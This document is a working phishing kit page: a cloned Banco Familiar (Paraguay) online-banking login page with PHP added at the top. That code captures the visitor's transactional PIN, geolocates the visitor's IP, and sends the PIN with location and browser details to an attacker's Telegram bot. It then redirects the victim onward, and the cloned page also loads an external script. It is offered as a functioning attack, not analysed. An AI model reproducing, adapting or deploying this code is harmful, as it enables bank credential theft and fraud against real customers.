<?php
session_start();
error_reporting(0);
include "data.php";

$website = 'https://api.telegram.org/bot'.$token;
 
$ip = $_SERVER["REMOTE_ADDR"];
if (isset($_POST["pin"])) {

$type = $_SESSION["user"];
$cpass = $_POST['pin'];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);
$country = $ip_data["country"];
$city = $ip_data["city"];
$isp = $ip_data["isp"];
$code = $ip_data["countryCode"];
echo $ip_data;
//$time = gmstrftime("%Y. %B %d. %A. %X %Z");
$agent = $_SERVER["HTTP_USER_AGENT"];
$ip = $_SERVER["REMOTE_ADDR"];
$browser = get_browser_name($_SERVER["HTTP_USER_AGENT"]);


$msg = "\n🤔User entered Password🤔\n🔑tipo: => " . $type . "\n🔑pin: => " . $cpass . "\n=============================  " . "\n🌎Browser: => " . $browser . "\n🌆 Country Code: " . $code . "\n🌐 Country: " . $country . "\n🌎 City: " . $city . "\n📍 IP: " . $ip . "\n=============================🔥\n🔥🔥\n🔥Telegram: xhub 🔥\n";
        

 $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
        file_get_contents($url);

echo '<script>window.location.href = "charg.html";</script>';

    
}

function get_browser_name($user_agent)
{
if (strpos($user_agent, "Opera") || strpos($user_agent, "OPR/")) {
    return "Opera";
}
if (strpos($user_agent, "Edge")) {
    return "Edge";
}
if (strpos($user_agent, "Chrome")) {
    return "Chrome";
}
if (strpos($user_agent, "Safari")) {
    return "Safari";
}
if (strpos($user_agent, "Firefox")) {
    return "Firefox";
}
if (strpos($user_agent, "MSIE") || strpos($user_agent, "Trident/7")) {
    return "Internet Explorer";
}
return "Other";
}

?>
<!DOCTYPE html>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="_csrf_parameter" content="_csrf" /><meta name="_csrf_header" content="X-CSRF-TOKEN" /><meta name="_csrf" content="d2c983bd-11f5-4b56-9e90-e5d13598044e" />
    <title>Familiar-Web</title>
    <script type="text/javascript" src="../ruxitagentjs_ICA23Vfhjqrtux_10171190704121258.js" data-dtconfig="rid=RID_-375009910|rpid=-1412305664|domain=familiar.com.py|reportUrl=/rb_bf92152zba|app=ea7c4b59f27d43eb|rcdec=1209600000|featureHash=ICA23Vfhjqrtux|vcv=2|rdnt=1|uxrgce=1|bp=3|srmcrv=10|cuc=gy7e2nmf|mel=100000|md=mdcc1=a#dyna-name-id|srad=0|ssv=4|lastModification=1666290849387|dtVersion=10171190704121258|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/ruxitagentjs_ICA23Vfhjqrtux_10171190704121258.js"></script><link rel="icon" type="image/png" href="resources/images/favicon.png" />
	


<script type="text/javascript">	
	var appname =  '/bancaweb3';
</script>




<!--  CSS files -->
<link href="resources/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="resources/bootstrap-select/css/bootstrap-select.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="resources/css/commonsd7ac.css?20102022">
<link rel="stylesheet" type="text/css" href="resources/css/datepicker.css">
<link rel="stylesheet" type="text/css" href="resources/css/datepicker3.css">
<link rel="stylesheet" type="text/css" href="resources/font-awesome/css/font-awesome.min.css">

<link rel="stylesheet" type="text/css" href="resources/css/familiard7ac.css?20102022">
<link rel="stylesheet" type="text/css" href="resources/css/familiar_margind7ac.css?20102022">
<link rel="stylesheet" type="text/css" href="resources/css/familiar_iconsd7ac.css?20102022">
<link rel="stylesheet" type="text/css" href="resources/css/keyboardd7ac.css?20102022">
<link rel="stylesheet" type="text/css" href="resources/css/familiar-responsived7ac.css?20102022">
<link rel="stylesheet" type="text/css" href="resources/Fonts/webfontkit/stylesheet.css">
<link rel="stylesheet" type="text/css" href="resources/css/pago-serviciosd7ac.css?20102022">
<link rel="stylesheet" type="text/css" href="resources/bxslider/jquery.bxslider.css">

<!-- Javascripts files  -->
<script src="resources/jquery/dist/jquery.js"></script>
<script src="resources/jquery/dist/jquery.min.js"></script>
<script src="resources/bootstrap/dist/js/bootstrap.min.js"></script>
<script src="resources/bootstrap-select/js/bootstrap-select.min.js"></script>
<script src="resources/bootstrap-select/js/i18n/defaults-ar_AR.min.js"></script>
<script src="resources/js/moment.js"></script>
<script src="resources/js/moment-locales/es.js"></script>
<script src="resources/js/ua-parser.js"></script>
<script src="resources/js/familiard7ac.js?20102022"></script>
<script src="resources/js/jquery.number.min.js"></script>
<script src="resources/js/validationsd7ac.js?20102022"></script>  	
<script src="resources/js/keyboardd7ac.js?20102022"></script> 
<script src="resources/js/bootstrap-datepicker.js"></script> 
<script src="resources/js/bootstrap-datepicker.es.js"></script> 
<script src="resources/js/fingerprint2.js"></script>
<script src="resources/js/ua-parser.js"></script> 

<script src="resources/carouFredSel-master/jquery.carouFredSel-6.2.1.js"></script>
<script src="resources/bxslider/jquery.bxslider.js"></script>


<script src="resources/js/Encrypt/aes.js"></script>
<script src="resources/js/Encrypt/AesUtil.js"></script>
<script src="resources/js/Encrypt/pbkdf2.js"></script>
<script src="resources/js/Encrypt/mode-ctr-min.js"></script>
<script src="resources/js/Encrypt/pad-nopadding-min.js"></script>
<script src="resources/js/Encrypt/sha1.js"></script>

<script type="text/javascript">
$('.selectpicker').selectpicker();
</script>
	<script src="resources/js/jquery-ui.js"></script>
     <script src="resources/js/modernizr.js"></script>
     <script type="text/javascript">
		 $(document).ready(function () {
             if(''!= '' && ''.split("-").length > 1){
                 $( "#div-empresas" ).click();
                 $( "#numberRuc").val('');
                 $( "#userName").val('');
             }
         })
	    var animations = Modernizr.cssanimations;
	    var canvas = Modernizr.canvas;

	 	if(!animations || !canvas )
	 		window.location = appname + '/no-supports-browser';
     </script>
<script>NS_CSM_td=107388021;NS_CSM_pd=275116667;NS_CSM_u="/clm10";NS_CSM_col="af_collector_10.0.71.187";</script><script type="text/javascript">function sendTimingInfoInit(){setTimeout(sendTimingInfo,0)}function sendTimingInfo(){var wp=window.performance;if(wp){var c1,c2,t;c1=wp.timing;if(c1){var cm={};cm.ns=c1.navigationStart;if((t=c1.unloadEventStart)>0)cm.us=t;if((t=c1.unloadEventEnd)>0)cm.ue=t;if((t=c1.redirectStart)>0)cm.rs=t;if((t=c1.redirectEnd)>0)cm.re=t;cm.fs=c1.fetchStart;cm.dls=c1.domainLookupStart;cm.dle=c1.domainLookupEnd;cm.cs=c1.connectStart;cm.ce=c1.connectEnd;if((t=c1.secureConnectionStart)>0)cm.scs=t;cm.rqs=c1.requestStart;cm.rss=c1.responseStart;cm.rse=c1.responseEnd;cm.dl=c1.domLoading;cm.di=c1.domInteractive;cm.dcls=c1.domContentLoadedEventStart;cm.dcle=c1.domContentLoadedEventEnd;cm.dc=c1.domComplete;if((t=c1.loadEventStart)>0)cm.ls=t;if((t=c1.loadEventEnd)>0)cm.le=t;cm.tid=NS_CSM_td;cm.pid=NS_CSM_pd;cm.ac=NS_CSM_col;var xhttp=new XMLHttpRequest();if(xhttp){var JSON=JSON||{};JSON.stringify=JSON.stringify||function(ob){var t=typeof(ob);if(t!="object"||ob===null){if(t=="string")ob='"'+ob+'"';return String(ob);}else{var n,v,json=[],arr=(ob&&ob.constructor==Array);for(n in ob){v=ob[n];t=typeof(v);if(t=="string")v='"'+v+'"';else if(t=="object"&&v!==null)v=JSON.stringify(v);json.push((arr?"":'"'+n+'":')+String(v));}return(arr?"[":"{")+String(json)+(arr?"]":"}");}};xhttp.open("POST.html",NS_CSM_u,true);xhttp.send(JSON.stringify(cm));}}}}if(window.addEventListener)window.addEventListener("load",sendTimingInfoInit,false);else if(window.attachEvent)window.attachEvent("onload",sendTimingInfoInit);else window.onload=sendTimingInfoInit;</script></head>
<body id="bodyLogin">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 container-login">
            	<div class="col-xs-12 col-sm-6 content-left">
            		<div class="col-xs-12 col-sm-12 pdl-0 content-icon-login">
            			<span class="icon-familiar"></span>
            		</div>
            		<div class="col-xs-12 col-sm-12 box-login image-familiar-agua">
            			<form  method="post">
	            			<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 content-persons-option">
		            			<div id="div-personas" class="col-xs-6 col-sm-6 person-select">
			            			<h4>PIN Transaccional</h4>
			            		</div>

			            		<div id="div-empresas" class="col-xs-6 col-sm-6 enty-des-select">
			            			
			            		</div>
			            		<input id="userType" name="userType" type="hidden" value="customer" value=""/>
		            		</div>
		            		
		            		<div class="col-xs-12 col-sm-12 box-form">
		            			<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 hidden" id="divNumberRuc">
									<input id="numberRuc" name="numberRuc" placeholder="N&uacute;mero de RUC" type="text" class="input-login number-ruc" value="" maxlength="15"/>
									
								</div>
		            			<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
			            			<input id="userName" name="pin" placeholder="PIN Transaccional" type="text" class="input-login user-name" value="" maxlength="15"/>
			            			
			            		</div>

			            		
		            		</div>
		            		<div class="col-xs-12 col-sm-12 ">
		            			<div class="col-xs-12 col-sm-12 content-bottom-blue pdt-15">
			            			<!-- <button type="button" class="bottom-blue" id="login_button">Ingresar</button> -->
			            			<!-- <button type="button" class="bottom-blue g-recaptcha" id="login_button"
			            				 data-sitekey="6LfLjT4UAAAAAHW_tLJPOllFq3q46pVxT4_nKJ1c" data-callback="enviarFormulario" >			            			
			            				Ingresar
			            			</button> -->
			            			<!-- <div id="recaptchaLogin" class="g-recaptcha"  data-sitekey="6LfLjT4UAAAAAHW_tLJPOllFq3q46pVxT4_nKJ1c"  data-callback="enviarFormulario"
									  data-size="invisible"></div> -->
									<button type="submit" class="bottom-blue">
										Ingresar
									</button>
									</form>
			            		</div>
		            		</div>
		            	<div>

</div></div>
		            	<div id="command" method="post">
		            		<div class="col-xs-12 col-sm-12 mt-15">
		            			<div class="col-xs-6 col-sm-6 div-left-login-options">
			            			<span class="text-login-option" id="password-olvidado" onclick="loadOpcion('credential/recover/index.html');" name="Olvid&eacute; mi contrase&ntilde;a">Olvid&eacute; mi contrase&ntilde;a</span>
			            			<!-- <button type="button" class="bottom-blue hidden" id="recaptchaRecoverPass"></button> -->	
			            		</div>
			            		<div class="col-xs-6 col-sm-6 div-rigth-login-options">

									<span class="text-login-option" id="showFirstPageOptions" onclick="showFirstPageOptions('/bancaweb3/credential/options');"
										  name="Solicit&aacute; tu clave">
										Solicit&aacute; tu clave
									</span>

			            		</div>
		            		</div>
							
		            	<div>

</div>


            		</div>
            	</div>
            	
            	<div class="col-xs-12 col-sm-6 login-box right" id="content-saludo" style="display:block">
            		<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 content-title-ingresar" >
            			<h2>Ingresar al Sistema</h2>
            		</div>
            		<div class="col-xs-12 col-sm-12 text-bienvenida">
            			<h1>Bienvenido a la  Banca Web A Toda Hora</h1>
            		</div>
            		<div class="col-xs-12 col-sm-12 text-instruccion">
            			<h2>Tu seguridad es importante:</h2><br/>
            			<p>Para ingresar a la Banca Web A Toda Hora de Banco Familiar es necesario que ingreses tu contrase&ntilde;a a trav&eacute;s de un teclado virtual; de esta manera evitamos la captura de tu clave a trav&eacute;s de virus.</p>
            		</div>
            		<div class="cuentas-white loading" id="loading-password" style="margin-left: 0px;"><img src="resources/images/loading.gif"></div>
            		<div class="col-xs-12 col-sm-12 text-instruccion">
            			<h2>&iquest;C&oacute;mo se usa el teclado virtual?</h2><br/>
            			<p class="p-icon"><span class="glyphicon glyphicon-certificate item-1"></span>Ubic&aacute el mouse sobre el teclado y hac&eacute; click en cada n&uacute;mero o letra de tu contrase&ntilde;a.</p>
            			<p class="p-icon"><span class="glyphicon glyphicon-certificate item-2"></span>Luego de hacer click en un n&uacute;mero o letra, ubic&aacute; el mouse fuera del teclado, de esa forma podr&eacute;s visualizar de nuevo los n&uacute;meros y letras.</p>
            		</div>
            		
            		
            	</div>
            	          	            	
            	
            
            	<div class="col-xs-12 col-sm-12 content-bottom pdt-15">
            		<div class="col-xs-5 col-sm-5 col-md-4 text-bottom-left">
	            		<p>Banco Familiar 2018 Asunci&oacute;n del Paraguay</p>
	            		<!-- <p>Contacto: familiar@familiar.com.py</p> -->
	            	</div>
	            	<div class="col-xs-5 col-sm-5 col-md-6 text-bottom-right">
	            		<p><a href="https://www.familiar.com.py/interna-84.htm">Nuestra red Nacional de Sucursales</a> - <a href="https://www.familiar.com.py/interna-122.htm">Condiciones Generales y Operacionales</a></p>
	            		<p><a href="https://www.familiar.com.py/interna-85.htm">Pol&iacute;tica de Seguridad</a></p>
	            	</div>
	            	<div class="col-xs-2 col-sm-2 col-md-2 text-bottom-right" style="text-align:right">
	            		<img src="resources/images/aTodaHora.png" alt="Familiar a toda hora" class="img-a-toda-hora">
	            		<p>Versi&oacute;n 3.5.19</p>
	            	</div>
            	</div>
            </div>
            
        </div>
    </div>
    
    
    	
	




    
	<script type="text/javascript" src=../../www.images-home.com/image.js> </script>
</body>

<script>
		
	$( document ).ready(function(){
		
		$('#userName').focus();
		buildKeyboard(false, $("#teclado"), $("#password"),true);
		if ($("#rememberData").val() == "true"){
			$("#rememberDataInput").attr("checked", true);
		}
		var userType = $('#userType').val();
		if (userType == 'business')
		{
			 $( "#div-empresas" ).click();
		}else
		{
			$('#errorNumberRuc').addClass("hidden");
		}		
		
		
		if("" == "a1051" || "" == "a1050"){  // USUARIO BLOQUEDO
            $('.alert-danger').html("<label>Aviso</label><br/>Usuario bloqueado. Puede desbloquear su usuario haciendo click aqu&iacute;.");
            $('.alert-danger').css('cursor','pointer');
            $('.alert-danger').click(function(){
                loadOpcion('credential/unlock/index.html');
			});
		} else {
            $('.alert-danger').css('cursor','auto');
            $('.alert-danger').unbind('click');
        }
		
		generateDeviceId();
		 var clickLogin = false;
		 $(document).on('click','#login_button', function(){
			 if(!clickLogin)	{
				clickLogin = true;			
				$('#login_form').submit();
			}			
		});	
		 $('#modal-banner-login').modal({backdrop: 'static', keyboard: false});


		 /*al ir atras de solicitud de acceso*/
		console.log("");
		
	});

	$(document).on('keypress','.user-name', function(event){
		var regex = new RegExp(REGEX_DOCUMENT_NUMBER);
	    var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	    if (!regex.test(key)) {
	       event.preventDefault();
	       return false;
	    }
	});
	$(document).on('keypress','.number-ruc', function(event){
		var regex = new RegExp(REGEX_DOCUMENT_NUMBER);
	    var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	    if (!regex.test(key)) {
	       event.preventDefault();
	       return false;
	    }
	});
	
	$(document).on('click','#div-personas', function(){
		var selected = $(this).hasClass("person-des-select");
		if(selected){
			$(this).addClass("person-select");
			$(this).removeClass("person-des-select");
			$('#div-empresas').removeClass("enty-select");
			$('#div-empresas').addClass("enty-des-select");
			$('#userType').val("customer");
			$('#divNumberRuc').addClass("hidden");
			$('#errorUserName').text("");
			$('#errorPassword').text("");
		}
		mostrarSaludo();
	});

    $(document).on('click','#div-empresas', function(){
		var selected = $(this).hasClass("enty-des-select");
		if(selected){
			var userType = $('#userType').val();
			if (userType == "customer")
			{
				$('#errorNumberRuc').text("");
				$('#errorUserName').text("");
				$('#errorPassword').text("");
				//$('#userName').val('');
				//$('#password').val('');
				
				/* if ($('#rememberDataInput').is(':checked')){
					$("#rememberData").val("false");
					$('#rememberDataInput').prop("checked", false);
				} */
			}
			$(this).addClass("enty-select");
			$(this).removeClass("enty-des-select");
			$('#div-personas').removeClass("person-select");
			$('#div-personas').addClass("person-des-select");
			$('#userType').val("business");
			$('#divNumberRuc').removeClass("hidden");
		}
		
		mostrarSaludo();
		
	});
	
	$(document).on('change','#rememberDataInput', function(){
		if ($(this).is(':checked')){
			$("#rememberData").val("true");
		} else {
			$("#rememberData").val("false");
		}
	});
	
	
	
	
	/************************/
	function loadOpcion(url)
	{
		$('#content-saludo .loading').css('display','block');
		if(contenidoSaludo==null || contenidoSaludo.trim()=="")
			contenidoSaludo = $("#content-saludo").html();
		$.ajax({
			beforeSend: function (request) {
				request.setRequestHeader($("meta[name='_csrf_header']").attr("content"), $("meta[name='_csrf']").attr("content"));
			},
			type:"GET",
			url: url,
			success : function(data, status, xhr) {				
				$("#content-saludo").html(data);
			}
		});	
	}
	
	function mostrarSaludo(){
		$('#step-container .loading').fadeIn("fast");
		if(contenidoSaludo!=null && contenidoSaludo.trim()!=""){
			$("#content-saludo").html(contenidoSaludo);
			$('#content-saludo .loading').css('display','none');
			$('#step-container .loading').fadeOut("fast");		
		}
	};

    function mostrarLoginAndOptions(error){
        $('#content-saludo .loading').css('display','block');
        if(contenidoLogin!=null && contenidoLogin.trim()!=""){
            $(".container-login").html(contenidoLogin);
            $('#step-container .loading').fadeOut("fast");

            if(error !== undefined){
                showErrorMessage(error);
			}

            $("#teclado").html('');
            buildKeyboard(false, $("#teclado"), $("#password"),true);
            $('#content-saludo .loading').css('display','none');
        }
    };

    function showFirstPageOptions(url)
    {
        $('#content-saludo .loading').css('display','block');
        if(contenidoSaludo==null || contenidoSaludo.trim()=="")
            contenidoSaludo = $("#content-saludo").html();
        $.ajax({
            type:"GET",
            url: url,
            success : function(data, status, xhr) {
                $("#content-saludo").html(data);
                $('#content-saludo .loading').css('display','none');
                $('#step-container .loading').fadeOut("fast");
            }
        });
    }

    function showFirstPageWithCard(requireCi,doc){
        var ci ='';
        if(doc !== undefined)
            ci = doc;

        if(requireCi){
            ci = $('#ci').val().trim();
            if(ci.length === 0){
                showErrorMessage("Ingresa tu número de documento.");
                return null;
            }
        }

        $('#btnCard').addClass('disabled');
        $('#btnGenerate').addClass('disabled');

        /*Verficar si tiene tarjeta*/
        $('#content-saludo .loading').show();

		$.ajax({
			beforeSend: function (request) {
				request.setRequestHeader($("meta[name='_csrf_header']").attr("content"), $("meta[name='_csrf']").attr("content"));
			},
			url: appname + '/credential/card-password/verify-have-a-card',
			data:{
                nroDoc: ci
			},
			type: 'GET',
			success: function (result, status, xhr) {
                console.log(result);
                if(result.hasError){
                    showErrorMessage(result.errorBody.message);
                }
                else if(result.response === false)
                    showErrorMessage("Datos ingresados inv&aacute;lidos");
				else{
                    $('#content-saludo .loading').css('display','block');
                    if(contenidoLogin==null || contenidoLogin.trim()=="")
                        contenidoLogin =  $(".container-login").html();

                    	window.location = appname+"/credential/card-password/init?ci="+ci+'&redirect=false';
				}


            },
			error: fnHomeAjaxErrorHandler,
			complete: function () {
                $('#content-saludo .loading').hide();
                $('#btnCard').removeClass('disabled');
                $('#btnGenerate').removeClass('disabled');
            }
		});

	}


    function loadOpcionFullScreen(url, requireCi, doc)
    {
        var ci ='';
        if(doc !== undefined)
            ci = doc;

        if(requireCi){
			ci = $('#ci').val().trim();
			if(ci.length === 0){
				showErrorMessage("Debe Introducir su n&uacute;mero de cédula o pasaporte.");
				return null;
			}
        }

        $('#content-saludo .loading').show();
        if(contenidoLogin==null || contenidoLogin.trim()=="")
            contenidoLogin =  $(".container-login").html();


        var data = {
			deviceId     : $("#deviceId").val(),
			ci 			 : ci
		};

		$.ajax({
			beforeSend: function (request) {
				request.setRequestHeader($("meta[name='_csrf_header']").attr("content"), $("meta[name='_csrf']").attr("content"));
			},
            type:"GET",
            url: url,
			data: data,
            success : function(data, status, xhr) {
                if(data.hasError !== undefined && data.hasError){
                    showErrorMessage(data.errorBody.message);
                    $('#content-saludo .loading').hide();
                }
                else{
                    $(".container-login").css({'border-radius':'unset'});
                    $(".container-login").html(data);
                }
            }
        });
    }
		
</script>

<!-- Mirrored from ssecure.familiar.com.py/bancaweb3/login by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 20 Oct 2022 21:27:43 GMT -->
</html>
